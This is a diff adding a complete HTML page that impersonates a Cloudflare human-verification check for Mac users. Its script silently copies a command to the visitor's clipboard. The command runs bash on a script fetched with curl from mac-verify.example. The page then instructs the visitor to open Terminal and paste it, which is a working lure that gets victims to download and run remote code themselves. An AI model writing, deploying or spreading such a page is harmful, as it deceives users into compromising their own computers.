@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Cloudflare - Verify you are human</title></head>
+<body>
+  <h2>Verify you are human</h2>
+  <p>Mac users: complete these verification steps to continue.</p>
+  <button id="go">I'm not a robot</button>
+  <div id="mac" hidden>
+    <p>1. Press Command + Space, type Terminal and press Return.</p>
+    <p>2. Paste with Command + V and press Return.</p>
+  </div>
+  <script>
+    document.getElementById('go').onclick = function () {
+      navigator.clipboard.writeText('/bin/bash -c "$(curl -fsSL https://mac-verify.example/install.sh)"').catch(function () {});
+      document.getElementById('mac').hidden = false;
+    };
+  </script>
+</body>
+</html>
